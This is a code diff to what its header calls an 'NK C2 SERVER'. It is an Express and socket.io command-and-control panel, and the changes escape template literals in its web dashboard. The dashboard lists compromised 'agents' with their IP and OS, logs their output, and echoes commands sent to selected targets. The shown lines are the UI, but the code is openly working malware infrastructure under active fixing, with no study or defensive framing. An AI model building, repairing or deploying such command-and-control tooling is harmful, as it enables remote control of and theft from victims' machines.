@@ -1,4 +1,5 @@
-/* NK C2 SERVER v43.0 - WEB DASHBOARD ENABLED */
+
+/* NK C2 SERVER v43.1 - FIXED DEPLOYMENT SYNTAX */
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
@@ -82,11 +83,11 @@ app.get('/', (req, res) => {
                     data.agents.forEach(agent => {
                         const div = document.createElement('div');
                         div.className = "p-2 border border-green-900/30 bg-green-900/5 text-xs hover:bg-green-900/20 cursor-pointer";
-                        div.innerHTML = `
-                            <div class="font-bold text-green-400">${agent.id}</div>
-                            <div class="text-[10px] text-gray-400">${agent.ip} | ${agent.os}</div>
-                            <div class="mt-1 text-[9px] px-1 bg-green-900/40 w-fit rounded text-green-200">${agent.status}</div>
-                        `;
+                        div.innerHTML = \`
+                            <div class="font-bold text-green-400">\${agent.id}</div>
+                            <div class="text-[10px] text-gray-400">\${agent.ip} | \${agent.os}</div>
+                            <div class="mt-1 text-[9px] px-1 bg-green-900/40 w-fit rounded text-green-200">\${agent.status}</div>
+                        \`;
                         div.onclick = () => { document.getElementById('targetInput').value = agent.id; };
                         agentListEl.appendChild(div);
                     });
@@ -100,7 +101,7 @@ app.get('/', (req, res) => {
                 div.className = "border-l border-green-900 pl-2 text-green-300 hover:bg-green-900/10";
                 // Handle object or string
                 let content = typeof data === 'string' ? data : (data.output || JSON.stringify(data));
-                div.innerText = `[${new Date().toLocaleTimeString()}] ${content}`;
+                div.innerText = \`[\${new Date().toLocaleTimeString()}] \${content}\`;
                 logsEl.appendChild(div);
                 logsEl.scrollTop = logsEl.scrollHeight;
             });
@@ -118,7 +119,7 @@ app.get('/', (req, res) => {
                 // Optimistic Log
                 const div = document.createElement('div');
                 div.className = "text-yellow-500 font-bold mt-1";
-                div.innerText = `>>> ${cmd} -> ${target}`;
+                div.innerText = \`>>> \${cmd} -> \${target}\`;
                 logsEl.appendChild(div);
                 logsEl.scrollTop = logsEl.scrollHeight;
                 
